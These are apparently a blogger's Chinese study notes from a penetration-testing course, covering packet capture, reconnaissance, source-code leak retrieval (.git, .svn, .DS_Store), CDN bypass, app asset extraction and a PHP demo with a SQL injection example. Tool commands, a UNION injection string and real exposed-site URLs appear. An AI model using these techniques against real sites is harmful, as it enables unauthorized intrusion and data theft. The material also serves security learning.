<h1 id="2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器"><a href="#2、第2天：基础入门-Web应用-架构搭建-漏洞-HTTP数据包-代理服务器" class="headerlink" title="2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器"></a>2、第2天：基础入门-Web应用&amp;架构搭建&amp;漏洞&amp;HTTP数据包&amp;代理服务器</h1><h2 id="1、网站的开发"><a href="#1、网站的开发" class="headerlink" title="1、网站的开发"></a>1、网站的开发</h2><p>这里也就是一些基础的web知识了，学会去购买服务器，域名等，并且以此去搭建一个自己的博客项目，这样也能去更好的理解一下网站的结构等相关知识。在这里就不过多的去讲解了，这都可以自己跟着网上的资料去学习的。</p>
<h2 id="2、web应用框架"><a href="#2、web应用框架" class="headerlink" title="2、web应用框架"></a>2、web应用框架</h2><p>理解不同WEB应用组成角色功能架构：</p>
<p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/e0c18ac5a06e048e519805fbc591a642--032f--image-20231129155607968.png" alt="image-20231129155607968"></p>
<h2 id="3、代理以及抓包"><a href="#3、代理以及抓包" class="headerlink" title="3、代理以及抓包"></a>3、代理以及抓包</h2><p>可以使用bp去实现抓到请求包，并且去修改从而达到我们想要的效果。</p>
<p>然后就是可以根据响应包的状态码去判断状态。</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2023-11-29/f9ff913739a0803b75f280912eff5134--c28f--image-20231129155736090.png" alt="image-20231129155736090"></p>
<h2 id="4、代理购买的作用"><a href="#4、代理购买的作用" class="headerlink" title="4、代理购买的作用"></a>4、代理购买的作用</h2><p>在网上去购买代理，就可以实现每次点击网站使用的就是不同的ip地址，这样就能去防止自身的ip被拉入黑名单后无法访问的问题。购买代理就像是在主机和被访问服务器之间新增了一个代理服务器，由这个服务器把你的请求拦截并由它发出，最后接收到的返回包也由它经手返回</p>
<h1 id="第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用"><a href="#第3天：基础入门-抓包-封包-协议-APP-小程序-PC应-WEB应用" class="headerlink" title="第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用"></a>第3天：基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应&amp;WEB应用</h1><h2 id="1、重点总结"><a href="#1、重点总结" class="headerlink" title="1、重点总结"></a>1、重点总结</h2><p>①为什么要抓包？ -抓包应用的资产信息进行安全测试</p>
<p>②抓包的对象有哪些？ -小程序，APP，桌面应用等</p>
<p>③抓包协议区别工具？ -有部分应用不走HTTP&#x2F;S，需要用到全局协议抓包</p>
<p>④封包和抓包不同之处？  -零散整体的区别，封包能精确到每一个操作的数据包。</p>
<h2 id="2、手机APP、小程序的抓包"><a href="#2、手机APP、小程序的抓包" class="headerlink" title="2、手机APP、小程序的抓包"></a>2、手机APP、小程序的抓包</h2><p>使用bp，Charles去抓包，小程序的话不方便使用bp，使用Charles更加方便。</p>
<p>bp抓包能够精准定位到每一次数据包的发送。</p>
<h2 id="3、全局协议抓包"><a href="#3、全局协议抓包" class="headerlink" title="3、全局协议抓包"></a>3、全局协议抓包</h2><p>可以去使用科来或者wireshark去抓包，直接对全局进行抓包，并不只局限于HTTP数据包，可以更方便的用于对一些应用的抓包。</p>
<h2 id="4、封包"><a href="#4、封包" class="headerlink" title="4、封包"></a>4、封包</h2><p>这里就可以去使用一个封包监听工具，可以去监听某个进程的数据包并且进行封包，封包的话就是可以将某种行为包装成一个数据包，我们就可以重新去发送这个数据包去重复某种行为，更加精确。这就很方便于对于游戏外挂相关的制作。</p>
<h1 id="第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#第4天：基础入门-30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值"></a>第4天：基础入门-30余种加密编码进制&amp;Web&amp;数据库&amp;系统&amp;代码&amp;参数值</h1><p>今天讲的这个就是属于很基础的一部分了，都是相关加密解密的，作为一个ctf选手这方面了解的也算挺多的，所以也就不过多去讲解了。</p>
<h2 id="1、文件加密"><a href="#1、文件加密" class="headerlink" title="1、文件加密"></a>1、文件加密</h2><p>通过各种语言自身的加密方式，对源代码进行加密，从而达到数据保护的功能。</p>
<p>dll加密、php加密、SQL加密、jar加密</p>
<h2 id="2、对编码的观察"><a href="#2、对编码的观察" class="headerlink" title="2、对编码的观察"></a>2、对编码的观察</h2><p>需要去熟悉一些加解密的相应特征，并且要求能够在碰见一些加密后的数据后能够去判断出加密方法并且对之进行解密。</p>
<h1 id="第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡"><a href="#第5天：基础入门-资产架构-端口-应用-CDN-WAF-站库分离-负载均衡" class="headerlink" title="第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡"></a>第5天：基础入门-资产架构&amp;端口&amp;应用&amp;CDN&amp;WAF&amp;站库分离&amp;负载均衡</h1><h2 id="1、CDN和负载均衡"><a href="#1、CDN和负载均衡" class="headerlink" title="1、CDN和负载均衡"></a>1、CDN和负载均衡</h2><p>CDN是购买结点，从而去达到工具服务器的作用，从而可以加速访问国外网站的作用，并且可以在被攻打时无法找到真正的网站服务器。</p>
<p>负载均衡时自身使用多台服务器，在访问的时候去随机访问一台服务器，从而也能起到防止渗透的作用。</p>
<h2 id="2、web安全问题"><a href="#2、web安全问题" class="headerlink" title="2、web安全问题"></a>2、web安全问题</h2><p>目录站点</p>
<p>端口站点</p>
<p>ip站点</p>
<p>服务器站点</p>
<p>站点插件</p>
<h2 id="3、番外安全问题"><a href="#3、番外安全问题" class="headerlink" title="3、番外安全问题"></a>3、番外安全问题</h2><p>域名注册商</p>
<p>服务器厂商</p>
<p>管理人员安全</p>
<h2 id="4、一些阻碍"><a href="#4、一些阻碍" class="headerlink" title="4、一些阻碍"></a>4、一些阻碍</h2><p>站库分离</p>
<p>CDN加速服务</p>
<p>负载均衡服务</p>
<p>WAF应用防火墙</p>
<p>主机防护防火墙</p>
<h1 id="第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#第6天：信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取"></a>第6天：信息打点-Web架构篇&amp;域名&amp;语言&amp;中间件&amp;数据库&amp;系统&amp;源码获取</h1><p>知识点：</p>
<p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等</p>
<p>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等</p>
<p>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他</p>
<p>4、打点-Web域名-子域名&amp;反查域名&amp;旁注等</p>
<p>信息点：</p>
<p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p>
<p>技术点：</p>
<p>CMS识别，端口扫描，CDN绕过，源码获取，子域名查询，WAF识别，负载均衡识别等</p>
<h1 id="第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#第7天：信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份"></a>第7天：信息打点-资产泄漏&amp;CMS识别&amp;Git监控&amp;SVN&amp;DS_Store&amp;备份</h1><p>知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p>
<p>详细点：<br>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p>
<p>源码泄漏集合：<br>composer.]son<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.m1泄露<br>DS Store文件泄露<br>SWP文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏</p>
<p>演示案例：<br>直接获取-CMS识别-云悉指纹识别平台<br>（yunsee.cn 在线指纹识别平台）<br>习惯不好备份文件-某黑阔博客源码泄漏<br>（网站管理员将网站备份到网站目录下造成源码泄露）<br>配置不当-GIT泄漏某程序员博客源码泄漏<br>参考链接：<a href="https://codeleading.com/article/54926468941/">https://codeleading.com/article/54926468941/</a><br>利用工具：<a href="https://github/lijiejie/GitHack">https://github/lijiejie/GitHack</a></p>
<p>当在一个空目录执行 git init 时，Git 会创建一个 .git 目录。 这个目录包含所有的 Git 存储和操作的对象。 如果想备份或复制一个版本库，只需把这个目录拷贝至另一处就可以了<br>比如某个网站存在.git文件泄露，可以：<br>利用方式：<br>github上的githack可以把整个.git备份的文件下载下来。它能解析 .git&#x2F;index 文件，并找到工程中所有的：文件名和文件 sha1，然后去 .git&#x2F;objects&#x2F; 文件夹下下载对应的文件，通过 zlib 解压文件，按原始的目录结构写入源代码<br>配置不当-SVN泄漏-某国外小伙子源码泄漏<br>SVN 是 Subversion 的简称，是一个开放源代码的版本控制系统，相较于 RCS、CVS，它采用了分支管理系统，它的设计目标就是取代 CVS。互联网上很多版本控制服务已从 CVS 迁移到 Subversion。<br>很多网站都使用了 svn 版本控制系统，和使用 git 版本控制器类似，很多开发者网站安全意识不足，代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留，因此攻击者可以使用工具 dvcs-ripper 下载网站源码。<br>当可以访问到&#x2F;.svn&#x2F;entries的时候，就证明存在了。<br>比如乌云曾经爆出的某个网站：</p>
<p><a href="http://data.5i5j.com/sitemetrics/.svn/entries">http://data.5i5j.com/sitemetrics/.svn/entries</a><br>利用工具 <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>工具命令 rip-svn.pl -v -u <a href="http://www.localhost.test/.svn/">http://www.localhost.test/.svn/</a></p>
<p>配置不当-DS Store泄漏-某开发Mac源码泄漏<br>.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。</p>
<p>这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 当你需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。通过.DS_Store可以知道这个目录里所有的文件名称。</p>
<p>当访问&#x2F;.ds_store可以访问的到，就证明存在。例如：</p>
<p><a href="http://www.baidu.com/.ds_store">http://www.baidu.com/.ds_store</a></p>
<p>工具:<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p>
<p>使用方式：</p>
<p>python ds_store_exp.py <a href="http://www.example.com/.DS_Store">http://www.example.com/.DS_Store</a></p>
<p>PHP特性-composer.json泄漏-某直接搭建源码泄漏</p>
<p>例如：<a href="http://57.128.195.180/composer.json">http://57.128.195.180/composer.json</a></p>
<blockquote>
<p>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</p>
<p>解题思路：访问靶场通过控制filename来任意文件下载</p>
<p>因为WEB-INF会存储配置文件，所以构造filename&#x3D;WEB-INF&#x2F;web.xml,此文件会记录源码的结构</p>
<p>访问文件内容，并构造文件名下载</p>
<p>最后通过反编译出flag</p>
</blockquote>
<blockquote>
<p>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工<br>通过github和google hack语法搜索相关信息<br>相关利用项目：</p>
<p>cMs识别：<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a> 备份：敏感目录文件扫描 -7 kbscan-WebPathBrute<br>CVS:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT:<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN:<a href="https://github.com/callmefeifei/SvnHack_DS">https://github.com/callmefeifei/SvnHack_DS</a><br>Store:<a href="https://github.com/lijiejie/ds_stor_exp">https://github.com/lijiejie/ds_stor_exp</a></p>
</blockquote>
<blockquote>
<p>GITHUB资源搜索：<br>in:name test #仓库标题搜索含有关键字<br>in:descripton test #仓库描述搜索含有关键字<br>in:readme test #Readme文件搜素含有关键字<br>stars:&gt;3000 test #stars数量大于3000的搜索关键字</p>
</blockquote>
<h1 id="第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#第8天-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙"></a>第8天 信息打点-系统篇&amp;端口扫描&amp;CDN服务&amp;负载均衡&amp;WAF防火墙</h1><p>知识点：<br>1、获取网络信息-服务厂商&amp;网络架构<br>2、获取服务信息-应用协议&amp;内网资产<br>3、获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p>
<p>详细点：<br>CDN服务，WAF防火墙，负载均衡，防火墙阻碍？</p>
<p>演示案例：<br>网络信息获取-服务厂商&amp;网络架构<br>通过域名信息查询获取 IP、云服务厂商、域名出售厂商、注册者邮箱等信息（可以使用威胁情报平台）</p>
<p>服务信息获取-协议应用&amp;内网资产<br>旁注：查询同一服务器下的不同WEB应用<br>C段：查询同一网段下，不同服务器部署的不同WEB应用<br>nmap target -Pn -osscan-limit -sV</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-Pn：不检测主机存活 -osscan-limit:扫操作系统 </span><br><span class="line"></span><br><span class="line">-sV：探测打开的端口以确定服务/版本信息</span><br></pre></td></tr></table></figure>

<p>阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙<br>超级ping:CDN服务识别（全国个地去ping目标地址，看访问的IP地址是否不同）<br>wafw00f识别waf、看图识别</p>
<p>ldb识别负载均衡</p>
<p>#相关利用项目：<br>Masscan:<a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a><br>Wafwoof:<a href="https://github.com/Enablesecurity/wafw00f">https://github.com/Enablesecurity/wafw00f</a><br>Kali上自带Nmap,Masscan,lbd等项目，超级ping:ping.chinaz.com<br>超级ping:CDN服务识别<br>Masscan:端口扫描，应用协议<br>Wafw00f:Web应用防护防火墙识别<br>namp：端口扫描，应用协议，防火墙识别<br>lbd:负载均衡，广域网负载均衡，应用层负载均衡</p>
<h1 id="第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件"><a href="#第9天-信息打点-CDN烧过篇-漏洞回链8接口探针-全网扫指-反向件" class="headerlink" title="第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件"></a>第9天 信息打点-CDN烧过篇&amp;漏洞回链8接口探针&amp;全网扫指&amp;反向件</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">知识点：</span><br><span class="line">1、CDN知识-工作原理及阻碍</span><br><span class="line">2、CDN配置-域名&amp;区域&amp;类型</span><br><span class="line">3、CDN绕过-靠谱十余种技战法</span><br><span class="line">4、CDN绑定-HOSTS绑定指向访问</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CDN 是构建在数据网络上的一种分布式的内容分发网。 CDN的作用是采用流媒体服务器集群技术，克服单机系统输出带宽及并发能力不足的缺点，可极大提升系统支持的并发流数目，减少或避免单点失效带来的不良影响。</p>
</blockquote>
<p>#前置知识<br>1.传统访问：用户访问域名-&gt;解析服务器IP-&gt;访问目标主机<br>2.普通CDN:用户访问域名-&gt;CDN节点-&gt;真实服务器IP-&gt;访问目标主机<br>3.带WAF的CDN:用户访问域名-&gt;CDN节点(WAF)-&gt;真实服务器IP-&gt;访问目标主机</p>
<p>CDN的使用:在阿里云平台上去进行按每一步配置即可。</p>
<p>#判定标准：<br>nslookup,各地ping(出现多个IP即启用CDN服务)<br>#参考知识：<br><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a><br><a href="https://www.cnblogs.com/blacksunny/p/5771827.html">https://www.cnblogs.com/blacksunny/p/5771827.html</a><br>子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包<br>黑暗空间引擎（yofo），通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示案例：</span><br><span class="line">真实应用-CDN绕过-漏洞&amp;遗留文件</span><br><span class="line">原理： 利用ssrf使得服务器主动请求VPS地址，此时通过在VPS地址监听请求即可得知真实地址。（相当于目标服务器主动请求VPS地址，vps会监听到真实地址）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-子域名查询操作</span><br><span class="line">原理：配置CDN时管理员考虑费用问题可能会将子域名排除在外，此时通过手机子域名信息即可得到真实地址（用于子域名应用和根域名应用部署在同一服务器的情况下）</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-接口查询国外访问</span><br><span class="line">原理：配置CDN时选择地域可能会仅设置成国内生效，此时使用国外地址访问获得真实地址</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-主动邮件配合备案</span><br><span class="line">原理:通过系统功能（如：密码找回发送邮件，查看邮件发送方地址找寻），通过备案信息确认，一般是通过备案的地点去判定</span><br><span class="line"></span><br><span class="line">真实应用-CDN绕过-全网扫描FuckCDN</span><br><span class="line">原理：扫描全球ip匹配web内容，实用工具匹配扫描网段title信息。需要大量时间很多情况下，不过也是最稳定的方法。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#参考知识：</span><br><span class="line">https://zhuanlan.zhihu.com/p/33440472</span><br><span class="line">https://www.cnblogs.com/blacksunny/p/5771827.html</span><br><span class="line">子域名，去掉www,邮件服务器，国外访问，证书查询，APP抓包</span><br><span class="line">黑暗空间引擎，通过漏洞或泄露获取，扫全网，以量打量，第三方接口查询等</span><br><span class="line">#案例资源：</span><br><span class="line">超级Ping:https://www.17ce.com/</span><br><span class="line">接口查询：https://get-site-ip.com/</span><br><span class="line">国外请求：https://tools.ipip.net/cdn.php</span><br><span class="line">全网扫描：https://github.com/Tai7sy/fuckcdn</span><br></pre></td></tr></table></figure>

<h1 id="第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取"><a href="#第10天-信息打点-APP-小程序篇-抓包封包-XP框架-反编译-资产提取" class="headerlink" title="第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取"></a>第10天 信息打点-APP&amp;小程序篇&amp;抓包封包&amp;XP框架&amp;反编译&amp;资产提取</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 知识点：</span><br><span class="line"></span><br><span class="line">1、小程序-外在-资产收集</span><br><span class="line">2、APP-外在&amp;内在-资产收集</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#### 演示案例：</span><br><span class="line"></span><br><span class="line">APP-外在抓包-Fd&amp;茶杯&amp;Burp</span><br><span class="line"></span><br><span class="line">APP-外在封包-封包监听工具</span><br><span class="line">使用封包监听也可抓到数据包</span><br></pre></td></tr></table></figure>

<p>APP-内在提取-ApplnfoScanner</p>
<blockquote>
<p>一款适用于以HW行动&#x2F;红队&#x2F;渗透测试团队为场景的移动端(Android、iOS、WEB、H5、静态网站)信息收集扫描工具，可以帮助渗透测试工程师、攻击队成员、红队成员快速收集到移动端或者静态WEB站点中关键的资产信息并提供基本的信息输出,如：Title、Domain、CDN、指纹信息、状态信息等。</p>
</blockquote>
<p>APP-内在搜索-反编译载入IDEA</p>
<ul>
<li>APP-资源提取-安装泡&amp;资源文件<br>使用安卓修改大师导入apk文件，可对域名资源进行收集</li>
</ul>
<p>​	还可使用IDEA对反编译出的项目进行资源收集</p>
<ul>
<li>APP-框架使用-Xposed&amp;JustTrustMe</li>
</ul>
<p>某些apk存在加壳的情况，会扫描失败，可以通过工具判断apk是否加壳</p>
<p>可通过安装xp框架的方式进行脱壳处理</p>
<p>小程序-微信-电脑版登录启动抓包分析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">APP安卓入手</span><br><span class="line">1、外在-抓包封包-资产安全测试</span><br><span class="line">资产收集-资源提取-ICO,MD5,HASH-黑暗引擎搜索相关资产</span><br><span class="line">2、外在-功能逻辑</span><br><span class="line">3、内在-反编译-JAVA代码代码审计</span><br><span class="line">4、内在-反编译-提取RES资源-黑暗资产收集</span><br></pre></td></tr></table></figure>

<h1 id="第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔"><a href="#第11天信息打点-红队工具篇-Fofa-Quake-Kunyu-Suize水泽-Ar灯塔" class="headerlink" title="第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔"></a>第11天信息打点-红队工具篇&amp;Fofa&amp;Quake&amp;Kunyu&amp;Suize水泽&amp;Ar灯塔</h1><p>知识点：<br>1、网络空间四大引擎-Fofa&amp;Quake&amp;shodan&amp;2 oomeye I<br>2、自动化信息收集项目-ARL灯塔&amp;Suize水泽s Kunyui坤舆<br>3、单点功能信息收集项目-企查：子域名指纹识别：社工信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##黑暗引擎：</span><br><span class="line">https://fofa.so</span><br><span class="line">https://quake.360.cn</span><br><span class="line">https://www.shodan.io</span><br><span class="line">https://www.zoomeye.org</span><br><span class="line">##自动项目：</span><br><span class="line">https://github.com/knownsec/Kunyu</span><br><span class="line">https://github.com/0x727/shuize 0x727</span><br><span class="line">https://github.com/TophantTechnology/ARL</span><br><span class="line">##相关资源：</span><br><span class="line">https://forum.ywhack.com/center.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、演示案例：网络空间-Fofa&amp;Quake&amp;Shodan&amp;Zoomeye</span><br><span class="line">工具测评网络空间四大黑暗彩擎集合版项目</span><br><span class="line">finger:通过调用zoomeyes和fofa的接口实现</span><br><span class="line">	通过fofa和zoomeyes两个接口去进行信息搜集</span><br><span class="line">2工具测评-自动化收集-ARL灯塔&amp;Suize水泽&amp;Kunyu</span><br><span class="line">Kunyu：通过调用zoomeyes API实现资产信息和漏洞信息收集 还能够通过一个api去进行相关漏洞的搜集</span><br><span class="line">ARL灯塔：自动化信息收集工具</span><br><span class="line">水泽Suize：认为是暂时最好用的一个工具，能够搜集到更加全面的信息。</span><br><span class="line">3、工具测评-单点功能器企查查&amp;子域名&amp;指纹识别&amp;社工</span><br><span class="line">相比自动化全部搜集的工具，所能搜集到的信息更加准确，但都是同一个方面的。</span><br><span class="line">上述工具都可以在菱角社区去找到。</span><br></pre></td></tr></table></figure>

<h1 id="第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受"><a href="#第12天：PHP开发-个人博客项目-文章功能显示-数据库操作-数据接受" class="headerlink" title="第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受"></a>第12天：PHP开发-个人博客项目_文章功能显示_数据库操作_数据接受</h1><p>首先ctf中注意的是php中的单双引号的区别，单引号不解析变量，双引号能够解析变量</p>
<p>知识点：<br>1、PHP入门-语法&amp;提交等<br>2、MsQL入门-数据库操作<br>3、HTML+CS5入门-样式编排</p>
<p>演示案例：<br>小迪博客文章阅读功能初步实现</p>
<p>实现功能：<br>前端文章导航，点入内容显示，更改I♪显示不同内容<br>实现步骤：<br>1、前端页面显示编写-HTML&amp;CSS<br>HTML 是一种用于创建网页的标记语言，全称为超文本标记语言。使用html构造显示前端文章导航站点。</p>
<p>2、数据库文章数据导入-MySQL工操作<br>首先配置数据库连接–验证数据库配置–定义数据查询到的变量并赋值–连接具体表–执行具体字段显示</p>
<p>每次查询数据时都需要执行核查数据库配置的语句所以可以把数据库连接配置写成配置文件</p>
<p>3、PHP操作MYSQL编写-PHP变量提交<br>要实现提交一个参数传到数据库中查询，需要先通过GET获取提交的参数，然后通过数据库语法（where id &#x3D; ?）指定查询内容(此处因为没有对传入的参数进行限制就导致了sql注入，例如where id&#x3D;1 union select name from admin)</p>
<p>除了使用GET传参外，还可以使用PSOT和REQUEST传参，这样就是sql注入中的get方式和post方式注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">组件：</span><br><span class="line">Navicat:操作数据库</span><br><span class="line">Dreamweaver:前端页面设计</span><br><span class="line">PhpStorm:PHP开发IDE</span><br><span class="line">phpStudy:PHP搭建环境</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
</search>
